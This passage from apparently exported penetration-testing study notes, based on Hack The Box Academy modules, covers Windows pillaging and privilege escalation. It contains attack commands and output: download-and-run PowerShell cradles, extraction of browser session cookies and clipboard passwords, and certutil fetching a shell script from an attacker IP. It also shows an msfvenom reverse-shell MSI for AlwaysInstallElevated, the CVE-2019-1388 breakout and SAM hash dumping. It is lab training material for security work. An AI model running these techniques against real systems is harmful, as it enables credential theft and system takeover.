creds you need.' and 'I'll better send you the creds over here.'](https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg)\n\n##### Cookie Extraction from Chromium-based Browsers\n\nThe chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.\n\nTo get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.\n\nLet's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.\n\n#### PowerShell Script - Invoke-SharpChromium\n\nPillaging\n\n```powershell-session\nPS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh\narpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')\nPS C:\\htb> Invoke-SharpChromium -Command \"cookies slack.com\"\n\n[*] Beginning Google Chrome extraction.\n\n[X] Exception: Could not find file 'C:\\Users\\lab_admin\\AppData\\Local\\Google\\Chrome\\User Data\\\\Default\\Cookies'.\n\n   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)\n   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)\n   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)\n   at SharpChromium.ChromiumCredentialManager.GetCookies()\n   at SharpChromium.Program.extract data(String path, String browser)\n[*] Finished Google Chrome extraction.\n\n[*] Done.\n```\n\nWe got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.\n\nWe can modify the code of `SharpChromium` or copy the cookie file to where SharpChromium is looking.\n\n`SharpChromium` is looking for a file in `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies`, but the actual file is located in `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.\n\n#### Copy Cookies to SharpChromium Expected Location\n\nPillaging\n\n```powershell-session\nPS C:\\htb> copy \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies\"\n```\n\nWe can now use Invoke-SharpChromium again to get a list of cookies in JSON format.\n\n#### Invoke-SharpChromium Cookies Extraction\n\nPillaging\n\n```powershell-session\nPS C:\\htb> Invoke-SharpChromium -Command \"cookies slack.com\"\n\n[*] Beginning Google Chrome extraction.\n\n--- Chromium Cookie (User: lab_admin) ---\nDomain         : slack.com\nCookies (JSON) :\n[\n\n<SNIP>\n\n{\n    \"domain\": \".slack.com\",\n    \"expirationDate\": 1974643257.67155,\n    \"hostOnly\": false,\n    \"httpOnly\": true,\n    \"name\": \"d\",\n    \"path\": \"/\",\n    \"sameSite\": \"lax\",\n    \"secure\": true,\n    \"session\": false,\n    \"storeId\": null,\n    \"value\": \"xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D\"\n},\n{\n    \"domain\": \".slack.com\",\n    \"hostOnly\": false,\n    \"httpOnly\": true,\n    \"name\": \"d-s\",\n    \"path\": \"/\",\n    \"sameSite\": \"lax\",\n    \"secure\": true,\n    \"session\": true,\n    \"storeId\": null,\n    \"value\": \"1659023172\"\n},\n\n<SNIP>\n\n]\n\n[*] Finished Google Chrome extraction.\n\n[*] Done.\n```\n\nWe can now use this cookie with cookie-editor as we did with Firefox.\n\n**Note:** When copy/pasting the contents of a cookie, make sure the value is one line.\n\n---\n\n## Clipboard\n\nIn many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. The `clipboard` provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.\n\nWe can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.\n\n#### Monitor the Clipboard with PowerShell\n\nPillaging\n\n```powershell-session\nPS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')\nPS C:\\htb> Invoke-ClipboardLogger\n```\n\nThe script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.\n\n#### Capture Credentials from the Clipboard with Invoke-ClipboardLogger\n\nPillaging\n\n```powershell-session\nPS C:\\htb> Invoke-ClipboardLogger\n\nhttps://portal.azure.com\n\nAdministrator@something.com\n\nSup9rC0mpl2xPa$$ws0921lk\n```\n\n**Note:** User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.\n\n---\n\n## Roles and Services\n\nServices on a particular host may serve the host itself or other hosts on the target network. It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. Typical server roles and services include:\n\n- File and Print Servers\n- Web and Database Servers\n- Certificate Authority Servers\n- Source Code Management Servers\n- Backup Servers\n\nLet's take `Backup Servers` as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.\n\n#### Attacking Backup Servers\n\nIn information technology, a `backup` or `data backup` is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event. Backups can be used to recover data after a loss due to data deletion or corruption or to recover data from an earlier time. Backups provide a simple form of disaster recovery. Some backup systems can reconstitute a computer system or other complex configurations, such as an Active Directory server or database server.\n\nTypically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.\n\nIf we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.\n\nAs we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use [restic](https://restic.net/) as an example. `Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.\n\nTo start working with `restic`, we must create a `repository` (the directory where backups will be stored). `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.\n\nWe will use `restic 0.13.1` and back up the repository `C:\\xampp\\htdocs\\webapp` in `E:\\restic\\` directory. To download the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). On our target machine, restic is located at `C:\\Windows\\System32\\restic.exe`.\n\nWe first need to create and initialize the location where our backup will be saved, called the `repository`.\n\n#### restic - Initialize Backup Directory\n\nPillaging\n\n```powershell-session\nPS C:\\htb> mkdir E:\\restic2; restic.exe -r E:\\restic2 init\n\n    Directory: E:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          8/9/2022   2:16 PM                restic2\nenter password for new repository:\nenter password again:\ncreated restic repository fdb2e6dd1d at E:\\restic2\n\nPlease note that knowledge of your password is required to access\nthe repository. Losing your password means that your data is\nirrecoverably lost.\n```\n\nThen we can create our first backup.\n\n#### restic - Back up a Directory\n\nPillaging\n\n```powershell-session\nPS C:\\htb> $env:RESTIC_PASSWORD = 'Password'\nPS C:\\htb> restic.exe -r E:\\restic2\\ backup C:\\SampleFolder\n\nrepository fdb2e6dd opened successfully, password is correct\ncreated new cache in C:\\Users\\jeff\\AppData\\Local\\restic\nno parent snapshot found, will read all files\n\nFiles:           1 new,     0 changed,     0 unmodified\nDirs:            2 new,     0 changed,     0 unmodified\nAdded to the repo: 927 B\n\nprocessed 1 files, 22 B in 0:00\nsnapshot 9971e881 saved\n```\n\nIf we want to back up a directory such as `C:\\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.\n\n#### restic - Back up a Directory with VSS\n\nPillaging\n\n```powershell-session\nPS C:\\htb> restic.exe -r E:\\restic2\\ backup C:\\Windows\\System32\\config --use-fs-snapshot\n\nrepository fdb2e6dd opened successfully, password is correct\nno parent snapshot found, will read all files\ncreating VSS snapshot for [c:\\]\nsuccessfully created snapshot for [c:\\]\nerror: Open: open \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config: Access is denied.\n\nFiles:           0 new,     0 changed,     0 unmodified\nDirs:            3 new,     0 changed,     0 unmodified\nAdded to the repo: 914 B\n\nprocessed 0 files, 0 B in 0:02\nsnapshot b0b6f4bb saved\nWarning: at least one source file could not be read\n```\n\n**Note:** If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.\n\nWe can also check which backups are saved in the repository using the `snapshot` command.\n\n#### restic - Check Backups Saved in a Repository\n\nPillaging\n\n```powershell-session\nPS C:\\htb> restic.exe -r E:\\restic2\\ snapshots\n\nrepository fdb2e6dd opened successfully, password is correct\nID        Time                 Host             Tags        Paths\n--------------------------------------------------------------------------------------\n9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\\SampleFolder\nb0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\\Windows\\System32\\config\nafba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\\Users\\jeff\\Documents\n--------------------------------------------------------------------------------------\n3 snapshots\n```\n\nWe can restore a backup using the ID.\n\n#### restic - Restore a Backup with ID\n\nPillaging\n\n```powershell-session\nPS C:\\htb> restic.exe -r E:\\restic2\\ restore 9971e881 --target C:\\Restore\n\nrepository fdb2e6dd opened successfully, password is correct\nrestoring <Snapshot 9971e881 of [C:\\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\\jeff@PILLAGING-WIN01> to C:\\Restore\n```\n\nIf we navigate to `C:\\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\\Restore\\C\\SampleFolder`.\n\nWe need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like `/etc/shadow` to crack users' credentials, web configuration files, `.ssh` directories to look for SSH keys, etc.\n\nIf we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us achieve our goal.\n\n**Note:** restic works similarly in Linux. If we don't know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that's the case, we will need to provide a password to restore the files.\n\nHundreds of applications and methods exist to perform backups, and we cannot detail each. This `restic` case is an example of how a backup application could work. Other systems will manage a centralized console and special repositories to save the backup information and execute the backup tasks.\n\nAs we move forward, we will find different backup systems, and we recommend taking the time to understand how they work so that we can eventually abuse their functions for our purpose.\n\n---\n\n## Conclusion\n\nThere are still plenty of locations, applications, and methods to obtain interesting information from a targeted host or a compromised network. We may find information in cloud services, network devices, IoT, etc. Be open and creative to explore your target and network and obtain the information you need using your methods and experience.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/28-Miscellaneous Techniques",
    "path": "02_CPTS/17-Windows Privilege Escalation/28-Miscellaneous Techniques.md",
    "title": "28 Miscellaneous Techniques",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Miscellaneous Techniques --- Living Off The Land Binaries and Scripts (LOLBAS) The LOLBAS project documents binaries, scripts, and libraries that can be used for \"living off the land\" techniques on Wi...",
    "category": "02_CPTS",
    "content": "# Miscellaneous Techniques\n\n---\n\n## Living Off The Land Binaries and Scripts (LOLBAS)\n\nThe [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for \"living off the land\" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. Some interesting functionality may include:\n\n||||\n|---|---|---|\n|Code execution|Code compilation|File transfers|\n|Persistence|UAC bypass|Credential theft|\n|Dumping process memory|Keylogging|Evasion|\n|DLL hijacking|||\n\n#### Transferring File with Certutil\n\nOne classic example is [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.\n\nMiscellaneous Techniques\n\n```powershell-session\nPS C:\\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat\n```\n\n#### Encoding File with Certutil\n\nWe can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.\n\nMiscellaneous Techniques\n\n```cmd-session\nC:\\htb> certutil -encode file1 encodedfile\n\nInput Length = 7\nOutput Length = 70\nCertUtil: -encode command completed successfully\n```\n\n#### Decoding File with Certutil\n\nOnce the new file has been created, we can use the `-decode` flag to decode the file back to its original contents.\n\nMiscellaneous Techniques\n\n```cmd-session\nC:\\htb> certutil -decode encodedfile file2\n\nInput Length = 70\nOutput Length = 7\nCertUtil: -decode command completed successfully.\n```\n\nA binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.\n\nIt is worth reviewing this project and becoming familiar with as many binaries, scripts, and libraries as possible. They could prove to be very useful during an evasive assessment, or one in which the client restricts us to only a managed Windows workstation/server instance to test from.\n\n---\n\n## Always Install Elevated\n\nThis setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.\n\n- `Computer Configuration\\Administrative Templates\\Windows Components\\Windows Installer`\n    \n- `User Configuration\\Administrative Templates\\Windows Components\\Windows Installer`\n    \n\n![Local Group Policy Editor showing Windows Installer settings. 'Always install with elevated privileges' is enabled. Other settings like 'Allow users to browse for source while elevated' are not configured.](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)\n\n#### Enumerating Always Install Elevated Settings\n\nLet's enumerate this setting.\n\nMiscellaneous Techniques\n\n```powershell-session\nPS C:\\htb> reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n\nHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n```\n\nMiscellaneous Techniques\n\n```powershell-session\nPS C:\\htb> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n```\n\nOur enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.\n\n#### Generating MSI Package\n\nWe can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.\n\nMiscellaneous Techniques\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of msi file: 159744 bytes\n```\n\n#### Executing MSI Package\n\nWe can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:\n\nMiscellaneous Techniques\n\n```cmd-session\nC:\\htb> msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart\n```\n\n#### Catching Shell\n\nIf all goes to plan, we will receive a connection back as `NT AUTHORITY\\SYSTEM`.\n\nMiscellaneous Techniques\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lnvp 9443\n\nlistening on [any] 9443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720\nMicrosoft Windows [Version 10.0.18363.592]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\n\nwhoami\nnt authority\\system\n```\n\nThis issue can be mitigated by disabling the two Local Group Policy settings mentioned above.\n\n---\n\n## CVE-2019-1388\n\n[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The `Issued By` field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. This OID value is identified in the [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header as [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.\n\nWhen we click on the hyperlink, a browser window will launch running as `NT AUTHORITY\\SYSTEM`. Once the browser is opened, it is possible to \"break out\" of it by leveraging the `View page source` menu option to launch a `cmd.exe` or `PowerShell.exe` console as SYSTEM.\n\nLet's run through the vulnerability in practice.\n\nFirst right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.\n\n![User Account Control prompt for HTML Help ActiveX Control. Verified publisher: Microsoft Corporation. File origin: Downloaded from the Internet. Program location: C:\\Tools\\hhupd.exe. Requires admin username and password. Options: Yes or No.](https://academy.hackthebox.com/storage/modules/67/hhupd.png)\n\nNext, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.\n\n![Certificate details window for Microsoft Corporation. Fields include Certificate Policies, Key Usage Restriction, and Thumbprint. Policy Information URL: https://www.verisign.com/repository/CPS.](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)\n\nNext, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.\n\n![Certificate Information window for Microsoft Corporation. Purpose: Ensures software authenticity and protection. Issued by VeriSign Commercial Software Publishers CA. Valid from 4/15/1998 to 4/16/1999.](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)\n\nIf we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.\n\n![Browser window showing 404 Error on VeriSign page. Task Manager open, listing multiple chrome.exe processes running under SYSTEM user, and other processes like conhost.exe and FileZilla Server.](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)\n\nNext, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.\n\n![Save As dialog open in Chrome with error message: 'Location is not available. C:\\Windows\\system32\\config\\systemprofile\\Desktop is unavailable.' Options to save webpage as 'Webpage, Complete' with OK button visible.](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)\n\nAt this point, we can launch any program we would like as SYSTEM. Type `c:\\windows\\system32\\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.\n\n![Command prompt running as NT AUTHORITY\\SYSTEM, showing Windows version. 'whoami' command confirms SYSTEM user. Save As dialog open with path C:\\Windows\\System32\\cmd.exe.](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)\n\nMicrosoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.\n\nThis [link](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) lists all of the vulnerable Windows Server and Workstation versions.\n\nNote: The steps above were done using the Chrome browser and may differ slightly in other browsers.\n\n---\n\n## Scheduled Tasks\n\n#### Enumerating Scheduled Tasks\n\nWe can use the [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) command to enumerate scheduled tasks on the system.\n\nMiscellaneous Techniques\n\n```cmd-session\nC:\\htb>  schtasks /query /fo LIST /v\n \nFolder: \\\nINFO: There are no scheduled tasks presently available at your access level.\n \nFolder: \\Microsoft\nINFO: There are no scheduled tasks presently available at your access level.\n \nFolder: \\Microsoft\\Windows\nINFO: There are no scheduled tasks presently available at your access level.\n \nFolder: \\Microsoft\\Windows\\.NET Framework\nHostName:                             WINLPE-SRV01\nTaskName:                             \\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319\nNext Run Time:                        N/A\nStatus:                               Ready\nLogon Mode:                           Interactive/Background\nLast Run Time:                        5/27/2021 12:23:27 PM\nLast Result:                          0\nAuthor:                               N/A\nTask To Run:                          COM handler\nStart In:                             N/A\nComment:                              N/A\nScheduled Task State:                 Enabled\nIdle Time:                            Disabled\nPower Management:                     Stop On Battery Mode, No Start On Batteries\nRun As User:                          SYSTEM\nDelete Task If Not Rescheduled:       Disabled\nStop Task If Runs X Hours and X Mins: 02:00:00\nSchedule:                             Scheduling data is not available in this format.\nSchedule Type:                        On demand only\nStart Time:                           N/A\nStart Date:                           N/A\nEnd Date:                             N/A\nDays:                                 N/A\nMonths:                               N/A\nRepeat: Every:                        N/A\nRepeat: Until: Time:                  N/A\nRepeat: Until: Duration:              N/A\nRepeat: Stop If Still Running:        N/A\n\n<SNIP>\n```\n\n#### Enumerating Scheduled Tasks with PowerShell\n\nWe can also enumerate scheduled tasks using the [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps) PowerShell cmdlet.\n\nMiscellaneous Techniques\n\n```powershell-session\nPS C:\\htb> Get-ScheduledTask | select TaskName,State\n \nTaskName                                                State\n--------                                                -----\n.NET Framework NGEN v4.0.30319                          Ready\n.NET Framework NGEN v4.0.30319 64                       Ready\n.NET Framework NGEN v4.0.30319 64 Critical           Disabled\n.NET Framework NGEN v4.0.30319 Critical              Disabled\nAD RMS Rights Policy Template Management (Automated) Disabled\nAD RMS Rights Policy Template Management (Manual)       Ready\nPolicyConverter                                      Disabled\nSmartScreenSpecific                                     Ready\nVerifiedPublisherCertStoreCheck                      Disabled\nMicrosoft Compatibility Appraiser                       Ready\nProgramDataUpdater                                      Ready\nStartupAppTask                                          Ready\nappuriverifierdaily                                     Ready\nappuriverifierinstall                                   Ready\nCleanupTemporaryState                                   Ready\nDsSvcCleanup                                            Ready\nPre-staged app cleanup                               Disabled\n\n<SNIP>\n```\n\nBy default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\\Windows\\System32\\Tasks`, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.\n\n#### Checking Permissions on C:\\Scripts Directory\n\nConsider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable `C:\\Scripts` directory that we overlooked in our initial enumeration.\n\nMiscellaneous Techniques\n\n```cmd-session\nC:\\htb> .\\accesschk64.exe /accepteula -s -d C:\\Scripts\\\n \nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright ⌐ 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n \nC:\\Scripts\n  RW BUILTIN\\Users\n  RW NT AUTHORITY\\SYSTEM\n  RW BUILTIN\\Administrators\n```\n\nWe notice various scripts in this directory, such as `db-backup.ps1`, `mailbox-backup.ps1`, etc., which are also all writeable by the `BUILTIN\\USERS` group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as `NT AUTHORITY\\SYSTEM` on the DB01 host. We can now safely assume that one of the backup scripts ran overnight and ran our appended code in the process. This is an example of how important even the slightest bit of information we uncover during enumeration can be to the success of our engagement. Enumeration and post-exploitation during an assessment are iterative processes. Each time we perform the same task across different systems, we may be gaining more pieces of the puzzle that, when put together, will get us to our goal.\n\n---\n\n## User/Computer Description Field\n\n#### Checking Local User Description Field\n\nThough more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) cmdlet.\n\nMiscellaneous Techniques\n\n```powershell-session\nPS C:\\htb> Get-LocalUser\n \nName            Enabled Description\n----            ------- -----------\nAdministrator   True    Built-in account for administering the computer/domain\nDefaultAccount  False   A user account managed by the system.\nGuest           False   Built-in account for guest access to the computer/domain\nhelpdesk        True\nhtb-student     True\nhtb-student_adm True\njordan          True\nlogger          True\nsarah           True\nsccm_svc        True\nsecsvc          True    Network scanner - do not change password\nsql_dev         True\n```\n\n#### Enumerating Computer Description Field with Get-WmiObject Cmdlet\n\nWe can also enumerate the computer description field via PowerShell using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet with the [Win32_OperatingSystem](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem) class.\n\nMiscellaneous Techniques\n\n```powershell-session\nPS C:\\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description\n \nDescription\n-----------\nThe most vulnerable box ever!\n```\n\n---\n\n## Mount VHDX/VMDK\n\nDuring our enumeration, we will often come across interesting files both locally and on network share drives. We may find passwords, SSH keys or other data that can be used to further our access. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase \"pass\" in the file name, KeePass database files, SSH keys, web.config files, and many more.\n\nThree specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are `Virtual Hard Disk`, `Virtual Hard Disk v2` (both used by Hyper-V), and `Virtual Machine Disk` (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of `.VMDK` and `.VHDX` files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.\n\nIf we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.\n\n#### Mount VMDK on Linux\n\nMiscellaneous Techniques\n\n```shell-session\ndrxh3kr@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk\n```\n\n#### Mount VHD/VHDX on Linux\n\nMiscellaneous Techniques\n\n```shell-session\ndrxh3kr@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1\n```\n\nIn Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.\n\n![Disk Management window showing Disk 0 with 39.98 GB, containing a 450 MB Recovery Partition, 99 MB EFI System Partition, and 39.45 GB NTFS Primary Partition. CD-ROM 0 labeled 'Hygiene (D:)' with 479 MB CDFS.](https://academy.hackthebox.com/storage/modules/67/mount.png)\n\nFor a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation `File --> Map Virtual Disks` to map the disk onto our base system. We could also add the `.vmdk` file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use `7-Zip` to extract data from a .`vmdk` file. This [guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) illustrates many methods for gaining access to the files on a `.vmdk` file.\n\n#### Retrieving Hashes using Secretsdump.py\n\nWhy do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\\Windows\\System32\\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.\n\nMiscellaneous Techniques\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL\n\nImpacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation\n\n[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba\n[*] Dumping local SAM hashes 